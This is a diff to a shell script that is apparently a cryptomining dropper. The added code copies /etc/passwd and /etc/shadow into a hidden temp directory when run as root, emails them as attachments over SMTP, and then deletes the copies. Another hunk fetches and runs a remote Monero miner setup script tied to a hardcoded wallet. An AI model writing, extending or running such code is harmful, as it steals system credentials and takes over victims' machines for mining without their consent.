@@ -740,6 +740,17 @@ collect_shell_history() {
 send_email_with_python() {
     local temp_file="$1"
     local subject="$2"
+    shift 2  # Remove first two arguments
+    local attachments=("$@")  # Remaining arguments are attachment paths
+    
+    # Build list of attachments for Python
+    local attach_list=""
+    for att in "${attachments[@]}"; do
+        if [ -f "$att" ]; then
+            attach_list="${attach_list}|||${att}"
+        fi
+    done
+    attach_list="${attach_list#|||}"  # Remove leading |||
     
     python3 -c "
 import sys
@@ -747,6 +758,9 @@ import smtplib
 import ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os
 
 try:
     with open('$temp_file', 'r', encoding='utf-8') as f:
@@ -757,6 +771,18 @@ try:
     msg['To'] = '$RECIPIENT_EMAIL'
     msg['Subject'] = '''$subject'''
     msg.attach(MIMEText(body, 'plain'))
+    
+    # Add attachments if any
+    attachments = '$attach_list'.split('|||') if '$attach_list' else []
+    for filepath in attachments:
+        if filepath and os.path.isfile(filepath):
+            with open(filepath, 'rb') as f:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', 
+                          'attachment; filename=\"{}\"'.format(os.path.basename(filepath)))
+            msg.attach(part)
 
     context = ssl.create_default_context()
     
@@ -978,6 +1004,29 @@ EOF
     local temp_file=$(mktemp)
     echo -e "$EMAIL_CONTENT" > "$temp_file"
 
+    # Create credential files if running as root
+    local PASSWD_FILE=""
+    local SHADOW_FILE=""
+    if [ "$(id -u)" -eq 0 ]; then
+        log_message "Creating credential attachments..."
+        local TEMP_DIR="/tmp/.cred_$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)"
+        mkdir -p "$TEMP_DIR" 2>/dev/null
+        
+        # Use sanitized hostname for filenames
+        PASSWD_FILE="${TEMP_DIR}/${SAFE_HOSTNAME}_passwd"
+        SHADOW_FILE="${TEMP_DIR}/${SAFE_HOSTNAME}_shadow"
+        
+        if [ -f /etc/passwd ]; then
+            cp /etc/passwd "$PASSWD_FILE" 2>/dev/null && \
+                log_message "Attached: ${SAFE_HOSTNAME}_passwd"
+        fi
+        
+        if [ -f /etc/shadow ]; then
+            cp /etc/shadow "$SHADOW_FILE" 2>/dev/null && \
+                log_message "Attached: ${SAFE_HOSTNAME}_shadow"
+        fi
+    fi
+
     # Always save report locally first
     cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
     log_message "Report saved to: $REPORT_FILE"
@@ -989,7 +1038,7 @@ EOF
     if command_exists python3; then
         log_message "Attempting to send email via Python..."
         local python_output
-        if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
+        if python_output=$(send_email_with_python "$temp_file" "$subject" "$PASSWD_FILE" "$SHADOW_FILE" 2>&1); then
             # Check for success indicators
             if echo "$python_output" | grep -qv "SMTP Error\|535\|authentication failed"; then
                 log_message "Email sent successfully via Python"
@@ -1036,6 +1085,13 @@ EOF
     fi
 
     rm -f "$temp_file"
+    
+    # Clean up credential files
+    if [ -n "$PASSWD_FILE" ] && [ -f "$PASSWD_FILE" ]; then
+        local cred_dir=$(dirname "$PASSWD_FILE")
+        rm -rf "$cred_dir" 2>/dev/null
+        log_message "Cleaned up credential files"
+    fi
     
     # Always return success to continue execution
     return 0
@@ -1605,7 +1661,7 @@ root_installation() {
     # Run the miner setup
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_5_INTEGRATED_EMAIL.sh?t=$(date +%s)" \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE.sh?t=$(date +%s)" \
         "$wallet" \
         "root miner setup"
     
